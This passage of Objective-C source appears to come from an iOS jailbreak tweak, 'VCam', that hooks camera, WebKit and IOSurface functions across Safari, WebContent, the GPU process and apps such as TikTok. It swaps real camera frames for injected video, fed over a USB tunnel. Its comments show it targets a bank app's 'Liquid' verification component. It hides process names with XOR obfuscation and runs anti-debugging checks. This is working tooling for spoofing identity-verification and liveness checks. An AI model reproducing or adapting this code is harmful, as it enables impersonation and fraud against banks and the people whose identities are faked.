                    if (!ucc) {
                        ucc = [[objc_getClass("WKUserContentController") alloc] init];
                        [config setValue:ucc forKey:@"userContentController"];
                    }

                    // Register message handler for stream mode frame delivery
                    @try {
                        static FMHdl *sMsgHandler = nil;
                        if (!sMsgHandler) sMsgHandler = [[FMHdl alloc] init];
                        // Remove existing handler first to avoid duplicate name crash
                        @try {
                            [(WKUserContentController *)ucc performSelector:@selector(removeScriptMessageHandlerForName:)
                                withObject:@"vcamFrame"];
                        } @catch (NSException *e2) {}
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                        [(WKUserContentController *)ucc performSelector:@selector(addScriptMessageHandler:name:)
                            withObject:sMsgHandler withObject:@"vcamFrame"];
#pragma clang diagnostic pop
                    } @catch (NSException *e) {}

                    WKUserScript *script = [(WKUserScript *)[objc_getClass("WKUserScript") alloc]
                        initWithSource:js injectionTime:0 forMainFrameOnly:NO];
                    [(WKUserContentController *)ucc addUserScript:script];

                    static int logCount = 0;
                    if (logCount < 3) {
                        logCount++;
                        vcam_log([NSString stringWithFormat:@"WebCam: JS injected [%@] (len=%lu)",
                            gWebCamIsVideo ? @"VIDEO" : @"IMAGE",
                            (unsigned long)js.length]);
                    }
                }
            } @catch (NSException *e) {
                vcam_log([NSString stringWithFormat:@"WebCam: inject error: %@", e]);
            }
            return orig(_self, sel, frame, config);
        });

        method_setImplementation(m, ni);
        vcam_log(@"WebCam: Hooked WKWebView init");

        // Also hook loadRequest: for lazy injection into pre-existing WKWebViews
        // (handles case where Safari was opened BEFORE VCam was enabled)
        SEL loadSel = @selector(loadRequest:);
        Method loadM = class_getInstanceMethod(wkClass, loadSel);
        if (loadM) {
            typedef id (*LF)(id, SEL, id);
            LF origLoad = (LF)method_getImplementation(loadM);

            IMP newLoad = imp_implementationWithBlock(^id(id _self, id request) {
                @try {
                    @try {
                        NSURL *u = [request valueForKey:@"URL"];
                        NSString *us = u ? [u absoluteString] : @"(nil)";
                        if (us.length > 200) us = [us substringToIndex:200];
                        vcam_log([NSString stringWithFormat:@"WebCam[load]: URL=%@", us]);
                    } @catch (NSException *e) {}
                    static const char kVCamTag = 0;
                    if (!objc_getAssociatedObject(_self, &kVCamTag)) {
                        NSString *lazyJS = vcam_buildWebCamJS();
                        if (lazyJS) {
                            id cfg = [_self valueForKey:@"configuration"];
                            id ucc2 = [cfg valueForKey:@"userContentController"];
                            if (ucc2) {
                                @try {
                                    static FMHdl *sLazy = nil;
                                    if (!sLazy) sLazy = [[FMHdl alloc] init];
                                    @try {
                                        [(WKUserContentController *)ucc2 performSelector:@selector(removeScriptMessageHandlerForName:)
                                            withObject:@"vcamFrame"];
                                    } @catch (NSException *e2) {}
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                    [(WKUserContentController *)ucc2 performSelector:@selector(addScriptMessageHandler:name:)
                                        withObject:sLazy withObject:@"vcamFrame"];
#pragma clang diagnostic pop
                                } @catch (NSException *e) {}
                                WKUserScript *s = [(WKUserScript *)[objc_getClass("WKUserScript") alloc]
                                    initWithSource:lazyJS injectionTime:0 forMainFrameOnly:NO];
                                [(WKUserContentController *)ucc2 addUserScript:s];
                                vcam_log(@"WebCam: lazy-injected JS via loadRequest");
                            }
                        }
                        objc_setAssociatedObject(_self, &kVCamTag, @YES, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
                    }
                } @catch (NSException *e) {}
                return origLoad(_self, loadSel, request);
            });
            method_setImplementation(loadM, newLoad);
            vcam_log(@"WebCam: Hooked WKWebView loadRequest");
        }
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"WebCam: hook error: %@", e]);
    }
}

// ============================================================
// Constructor
// ============================================================
__attribute__((constructor))
static void vcamplus_init(void) {
    @autoreleasepool {
        NSString *proc = [[NSProcessInfo processInfo] processName];
        NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"(nil)";

        // CRITICAL: bail out for system daemons that shouldn't have us injected
        // Our filter (UIKit+WebKit) is sometimes bypassed under RootHide and these
        // get loaded too — running our hooks here causes watchdog timeouts and
        // crashes in sandboxed apps that detect unexpected activity
        static NSSet *daemonBL = nil;
        if (!daemonBL) {
            daemonBL = [NSSet setWithArray:@[
                @"imagent", @"sharingd", @"nanoregistryd", @"locationd",
                @"profiled", @"passd", @"callservicesd", @"anomalydetectiond",
                @"assistantd", @"touchsetupd", @"AccessibilityUIServer", @"remindd",
                @"SafariBookmarksSyncAgent", @"ScreenTimeAgent",
                @"ScreenshotServicesService", @"Spotlight",
                @"mediaserverd", @"backboardd", @"thermalmonitord",
                @"runningboardd", @"wifid", @"configd", @"logd",
                @"PosterBoard", @"WeatherPoster", @"AegirPoster",
                @"AuthenticationServicesAgent", @"CollectionsPoster",
                @"EmojiPosterExtension", @"ExtragalacticPoster",
                @"GradientPosterExtension", @"PhotosPosterProvider",
                @"PhotosReliveWidget", @"PridePosterExtension",
                @"ScreenTimeWidgetExtension", @"UnityPosterExtension",
                @"WeatherWidget", @"PhotoPicker"
            ]];
        }
        if ([daemonBL containsObject:proc]) {
            return; // silent bail
        }

        [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR
            withIntermediateDirectories:YES attributes:nil error:nil];
        vcam_log([NSString stringWithFormat:@"CONSTRUCTOR: proc=%@ bid=%@", proc, bid]);

        // On any install/reinstall: disable vcam so user must re-enable manually
        // No install detection — vcam_isEnabled() already returns NO when no video source exists,
        // so fresh installs naturally default to real camera without needing to delete VCAM_FLAG.

        // mediaserverd — delay 5s to avoid blocking daemon startup
        if ([proc isEqualToString:_ds("\x5A\x52\x53\x5E\x56\x44\x52\x45\x41\x52\x45\x53",12)]) {
            _chkA(); // Check license for mediaserverd
            _antiDbgCheck(); _integrityCheck();
            return;
        }

        // WebContent — hook camera frame delivery for getUserMedia
        if ([proc containsString:_ds("\x60\x52\x55\x74\x58\x59\x43\x52\x59\x43",10)]) {
            gLockA = [[NSLock alloc] init];
            gLockB = [[NSLock alloc] init];
            gHookedClasses = [NSMutableSet new];
            gHookIMPs = [NSMutableSet new];
            gCICtx = [CIContext contextWithOptions:@{kCIContextUseSoftwareRenderer: @NO}];

            [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR
                withIntermediateDirectories:YES attributes:nil error:nil];
            vcam_log([NSString stringWithFormat:@"WC LOADED in %@ (%@)", proc, bid]);
            _chkA(); // Check license for WebContent
            _adPtrace(); _antiDbgCheck(); _integrityCheck();

            // Install hooks immediately (must be ready before camera starts)
            vcam_webcontent_installHooks();

            // Hook CVPixelBufferLockBaseAddress (C function) to intercept camera frames
            // from GPU process delivered via IOSurface IPC to WebContent
            // Load MSHookFunction at runtime via dlsym (no link-time substrate dependency)
            if (!_pMSHookFunction) {
                void *substrate = dlopen("/usr/lib/libsubstrate.dylib", RTLD_LAZY);
                if (!substrate) substrate = dlopen("/var/jb/usr/lib/libsubstrate.dylib", RTLD_LAZY);
                if (!substrate) substrate = dlopen("/var/jb/usr/lib/substitute-inserter.dylib", RTLD_LAZY);
                if (substrate) _pMSHookFunction = (MSHookFunction_t)dlsym(substrate, "MSHookFunction");
                vcam_log([NSString stringWithFormat:@"WC: substrate=%p MSHookFunction=%p", substrate, _pMSHookFunction]);
            }
            if (_pMSHookFunction) {
                _pMSHookFunction((void *)CVPixelBufferLockBaseAddress, (void *)hooked_WC_CVPBLockBA, (void **)&orig_WC_CVPBLockBA);
                vcam_log(@"WC: Hooked CVPixelBufferLockBaseAddress");

                // Hook IOSurface functions to intercept GPU→WebContent frame transfer
                _pMSHookFunction((void *)IOSurfaceLock, (void *)hooked_IOSurfaceLock, (void **)&orig_IOSurfaceLock);
                _pMSHookFunction((void *)IOSurfaceLookupFromMachPort, (void *)hooked_IOSurfaceLookupFromMachPort, (void **)&orig_IOSurfaceLookupFromMachPort);
                vcam_log(@"WC: Hooked IOSurfaceLock + IOSurfaceLookupFromMachPort");
            } else {
                vcam_log(@"WC: MSHookFunction not found, C hooks skipped");
            }

            return;
        }

        // WebKit GPU process — this is where AVCaptureSession runs for Safari getUserMedia
        // Detect via bundle ID containing "WebKit.GPU" or process name containing "GPU" with WebKit bundle
        BOOL isGPU = [bid containsString:_ds("\x60\x52\x55\x7C\x5E\x43\x19\x70\x67\x62",10)] ||
                     ([proc containsString:_ds("\x70\x67\x62",3)] && ([bid containsString:_ds("\x60\x52\x55\x7C\x5E\x43",6)] || [proc containsString:_ds("\x60\x52\x55\x7C\x5E\x43",6)]));
        if (isGPU) {
            gLockA = [[NSLock alloc] init];
            gLockB = [[NSLock alloc] init];
            gHookedClasses = [NSMutableSet new];
            gHookIMPs = [NSMutableSet new];
            gCICtx = [CIContext contextWithOptions:@{kCIContextUseSoftwareRenderer: @NO}];

            [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR
                withIntermediateDirectories:YES attributes:nil error:nil];
            vcam_log([NSString stringWithFormat:@"GPU LOADED in %@ (%@)", proc, bid]);
            _chkA(); // Check license for GPU
            _adPtrace(); _antiDbgCheck(); _integrityCheck();

            // Hook AVCaptureVideoDataOutput delegate (same as APP mode)
            {
                Class cls = objc_getClass("AVCaptureVideoDataOutput");
                SEL sel = @selector(setSampleBufferDelegate:queue:);
                Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
                if (m) {
                    typedef void (*F)(id, SEL, id, dispatch_queue_t);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self, id delegate, dispatch_queue_t queue) {
                        @try {
                            if (delegate) {
                                Class dcls = object_getClass(delegate);
                                vcam_log([NSString stringWithFormat:@"GPU setDelegate: %@", NSStringFromClass(dcls)]);
                                vcam_hookClass(dcls);
                            }
                        } @catch (NSException *e) {}
                        if (orig) orig(_self, sel, delegate, queue);
                    });
                    method_setImplementation(m, ni);
                    vcam_log(@"GPU: Hooked setSampleBufferDelegate:");
                } else {
                    vcam_log(@"GPU: AVCaptureVideoDataOutput setSampleBufferDelegate: NOT FOUND");
                }
            }

            // Hook AVCaptureSession startRunning
            {
                Class cls = objc_getClass("AVCaptureSession");
                SEL sel = @selector(startRunning);
                Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
                if (m) {
                    typedef void (*F)(id, SEL);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self) {
                        if (orig) orig(_self, sel);
                        vcam_log(@"GPU: AVCaptureSession startRunning");
                    });
                    method_setImplementation(m, ni);
                    vcam_log(@"GPU: Hooked AVCaptureSession startRunning");
                } else {
                    vcam_log(@"GPU: AVCaptureSession startRunning NOT FOUND");
                }
            }

            // Hook WebCoreAVVideoCaptureSourceObserver if it exists here
            Class wcObserver = objc_getClass("WebCoreAVVideoCaptureSourceObserver");
            if (wcObserver) {
                vcam_hookClass(wcObserver);
                vcam_log(@"GPU: Hooked WebCoreAVVideoCaptureSourceObserver");
            } else {
                vcam_log(@"GPU: WebCoreAVVideoCaptureSourceObserver NOT FOUND in GPU process");
            }

            // Hook AVSampleBufferDisplayLayer
            {
                Class cls = objc_getClass("AVSampleBufferDisplayLayer");
                SEL sel = @selector(enqueueSampleBuffer:);
                Method m = cls ? class_getInstanceMethod(cls, sel) : NULL;
                if (m) {
                    typedef void (*F)(id, SEL, CMSampleBufferRef);
                    F orig = (F)method_getImplementation(m);
                    IMP ni = imp_implementationWithBlock(^(id _self, CMSampleBufferRef sb) {
                        @try {
                            if (vcam_isEnabled() && sb) vcam_replaceInPlace(sb);
                        } @catch (NSException *e) {}
                        if (orig) orig(_self, sel, sb);
                    });
                    method_setImplementation(m, ni);
                }
            }

            vcam_log(@"GPU: Hooks installed");
            // Register controls notification for GPU web mode
            CFNotificationCenterAddObserver(
                CFNotificationCenterGetDarwinNotifyCenter(), NULL,
                vcam_controlsChangedNotif,
                (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x54\x43\x45\x5B",17), NULL,
                CFNotificationSuspensionBehaviorDeliverImmediately);

            return;
        }

        // Safari UI process: install JS getUserMedia override (no APP mode hooks)
        if ([bid isEqualToString:_ds("\x54\x58\x5A\x19\x56\x47\x47\x5B\x52\x19\x5A\x58\x55\x5E\x5B\x52\x44\x56\x51\x56\x45\x5E",22)] ||
            [proc isEqualToString:_ds("\x64\x56\x51\x56\x45\x5E",6)]) {
            [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR
                withIntermediateDirectories:YES attributes:nil error:nil];
            vcam_log([NSString stringWithFormat:@"LOADED in %@ (%@) [WebCam JS mode]", proc, bid]);
            _chkA(); // Check license for Safari
            _adPtrace(); _antiDbgCheck(); _integrityCheck();
            vcam_installWebCamHook();
            return;
        }

        // Skip other WebKit helper processes (Networking, Storage, etc.)
        if ([proc containsString:_ds("\x60\x52\x55\x7C\x5E\x43",6)] || [proc containsString:_ds("\x79\x52\x43\x40\x58\x45\x5C\x5E\x59\x50",10)]) {
            return;
        }

        // Skip system daemons/extensions that never use cameras — saves memory + API calls
        BOOL isSB = [proc isEqualToString:_ds("\x64\x47\x45\x5E\x59\x50\x75\x58\x56\x45\x53",11)];
        if (!isSB) {
            static NSArray *sSkipPatterns = nil;
            static dispatch_once_t sOnce;
            dispatch_once(&sOnce, ^{
                sSkipPatterns = @[
                    @"Poster", @"Accessibility", @"Spotlight", @"ScreenTime",
                    @"fitcore", @"nanotimekit", @"splashboard", @"springboardservices",
                    @"HealthKit", @"backboardd", @"aggregated", @"coreduet",
                    @"dataaccessd", @"remindd", @"callservicesd", @"mediaremoted",
                    @"CommCenter", @"wifid", @"locationd", @"symptomsd",
                    @"ReportCrash", @"UserEvent", @"biomesyncd", @"PhotoPicker",
                    @"Sileo", @"Filza", @"Zebra", @"Cydia", @"Installer",
                    @"Dopamine", @"PassbookUIService", @"ServiceExtension",
                    @"Widget", @"ASPCarryLog", @"FinHealth", @"ContainerManager",
                    @"CloudKeychainProxy", @"nsurlsessiond", @"sharingd",
                    @"tipsd", @"translationd", @"contactsd", @"identityservicesd",
                    @"imagent", @"IMTransferAgent",
                    @"AXRuntime", @"bird", @"lsd", @"pkd", @"trustd",
                    @"Relive", @"Stocks", @"News", @"Tips", @"Books",
                    @"Podcasts", @"Fitness", @"Translate",
                    @"osanalytics", @"diagnosticextensions", @"IMDMessage",
                    @"NotificationService", @"AegirPoster",
                    @"wcd", @"fitnesscoaching", @"ManagedSettings",
                    @"webbookmarksd", @"ndoagent", @"linkd",
                    @"healthrecord", @"AccountSubscriber",
                    @"heard", @"CircleJoinRequested",
                ];
            });
            for (NSString *pat in sSkipPatterns) {
                if ([proc containsString:pat] || [bid containsString:pat]) {
                    return;
                }
            }
        }

        gBootTime = CACurrentMediaTime();
        gLockA = [[NSLock alloc] init];
        gLockB = [[NSLock alloc] init];
        gStreamLock = [[NSLock alloc] init];
        gOverlays = [NSMutableArray new];
        gHookedClasses = [NSMutableSet new];
        gHookedPhotoClasses = [NSMutableSet new];
        gHookIMPs = [NSMutableSet new];
        gCICtx = [CIContext contextWithOptions:@{kCIContextUseSoftwareRenderer: @NO}];

        [[NSFileManager defaultManager] createDirectoryAtPath:VCAM_DIR
            withIntermediateDirectories:YES attributes:nil error:nil];
        [[NSFileManager defaultManager] setAttributes:@{NSFilePosixPermissions: @(0777)}
            ofItemAtPath:VCAM_DIR error:nil];
        vcam_log([NSString stringWithFormat:@"LOADED in %@ (%@) [build 179]", proc, bid]);

        // Ensure device ID is ready before license check
        _sDID();
        // Check license on startup
        _chkA();
        @try { _integrityCheck(); } @catch (NSException *e) {}

        gPreviewLayerClass = NSClassFromString(@"AVCaptureVideoPreviewLayer");
        NSArray *known = @[@"IESMMCaptureKit", @"AWECameraAdapter", @"HTSLiveCaptureKit",
            @"IESLiveCaptureKit", @"IESMMCameraSession"];
        for (NSString *name in known) {
            Class cls = NSClassFromString(name);
            if (cls) vcam_hookClass(cls);
        }
        vcam_installHooks();
        // Pre-hook AVCapturePhoto base class; subclasses hooked dynamically in delegate callback
        vcam_hookPhotoDataOnClass(objc_getClass("AVCapturePhoto"));

        // TikTok/Douyin: scan ByteDance SDK classes for photo-related methods
        if ([bid containsString:@"musically"] || [bid containsString:@"Aweme"] ||
            [bid containsString:@"ugc"] || [proc containsString:@"TikTok"]) {
            vcam_log(@"=== TikTok detected, scanning SDK classes ===");
            NSArray *scanClasses = @[@"IESMMCaptureKit", @"AWECameraAdapter", @"HTSLiveCaptureKit",
                @"IESLiveCaptureKit", @"IESMMCameraSession", @"IESMMCamera",
                @"AWERecorder", @"AWECameraContainerViewController",
                @"IESMMCameraSessionConfiguration", @"IESMMRecorder"];
            for (NSString *name in scanClasses) {
                Class cls = NSClassFromString(name);
                if (!cls) continue;
                unsigned int mcount = 0;
                Method *methods = class_copyMethodList(cls, &mcount);
                if (methods) {
                    for (unsigned int i = 0; i < mcount; i++) {
                        NSString *selName = NSStringFromSelector(method_getName(methods[i]));
                        NSString *lower = [selName lowercaseString];
                        if ([lower containsString:@"photo"] || [lower containsString:@"picture"] ||
                            [lower containsString:@"capture"] || [lower containsString:@"snap"] ||
                            [lower containsString:@"still"] || [lower containsString:@"shot"] ||
                            [lower containsString:@"take"]) {
                            vcam_log([NSString stringWithFormat:@"  -[%@ %@]", name, selName]);
                        }
                    }
                    free(methods);
                }
            }
            vcam_log(@"=== End TikTok scan ===");
        }

        // Also install web camera hook for in-app WKWebViews (WeChat mini-programs, etc.)
        vcam_installWebCamHook();

        // Register Darwin notification for controls push from SpringBoard floating window
        if (![proc isEqualToString:_ds("\x64\x47\x45\x5E\x59\x50\x75\x58\x56\x45\x53",11)]) {
            CFNotificationCenterAddObserver(
                CFNotificationCenterGetDarwinNotifyCenter(), NULL,
                vcam_controlsChangedNotif,
                (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x54\x43\x45\x5B",17), NULL,
                CFNotificationSuspensionBehaviorDeliverImmediately);
            vcam_log(@"Registered controls notification listener");
        }

        // Register Darwin notification for auth revocation broadcast
        CFNotificationCenterAddObserver(
            CFNotificationCenterGetDarwinNotifyCenter(), NULL,
            vcam_authOffNotif,
            (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x56\x42\x43\x5F\x58\x51\x51",20), NULL,
            CFNotificationSuspensionBehaviorDeliverImmediately);

        // Register Darwin notification for auth restoration broadcast
        CFNotificationCenterAddObserver(
            CFNotificationCenterGetDarwinNotifyCenter(), NULL,
            vcam_authOnNotif,
            (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x56\x42\x43\x5F\x58\x59",19), NULL,
            CFNotificationSuspensionBehaviorDeliverImmediately);

        vcam_log(@"Hooks initialized");

        // Bank-app workaround: Hyakugo's actual AVCaptureVideoDataOutput is
        // NSKVONotifying_AVCaptureVideoDataOutput (KVO subclass), so our hook on the
        // base class doesn't intercept setSampleBufferDelegate. Frames flow directly
        // to Liquid.SampleBufferProcesser without our interception.
        // Solution: directly hook captureOutput on Liquid.SampleBufferProcesser via
        // MSHookMessageEx. The class loads only after Liquid.framework is loaded
        // (later than our constructor), so poll for it.
        static int kBankClassPollCount = 0;
        __block dispatch_source_t pollTimer = NULL;
        pollTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER,
            0, 0, dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0));
        dispatch_source_set_timer(pollTimer,
            dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
            (uint64_t)(0.5 * NSEC_PER_SEC), 0);
        dispatch_source_set_event_handler(pollTimer, ^{
            kBankClassPollCount++;
            if (kBankClassPollCount > 60) {  // give up after 30s
                dispatch_source_cancel(pollTimer);
                return;
            }
            const char *targets[] = {
                "Liquid.SampleBufferProcesser",
                NULL
            };
            for (int i = 0; targets[i]; i++) {
                Class c = NSClassFromString([NSString stringWithUTF8String:targets[i]]);
                if (!c) continue;
                @synchronized(gHookedClasses) {
                    if ([gHookedClasses containsObject:NSStringFromClass(c)]) continue;
                }
                vcam_log([NSString stringWithFormat:@"Bank class %s found, hooking captureOutput via MSHookMessageEx", targets[i]]);
                vcam_hookClass(c);
                dispatch_source_cancel(pollTimer);
                return;
            }
        });
        dispatch_resume(pollTimer);

        // Periodic re-validation: only in SpringBoard to avoid excessive API calls
        // Other processes rely on _chkA() at startup + authOffNotif for revocation
        if (isSB) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60.0 * NSEC_PER_SEC)),
                dispatch_get_global_queue(0, 0), ^{ _reVal(); });

            // Start USB stream server (port 8765) — receives frames from
            // Windows EXE via pymobiledevice3 USB tunnel. Always-on in SB.
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)),
                dispatch_get_global_queue(0, 0), ^{ [[USBStreamSrv shared] start]; });
        }
    }
}
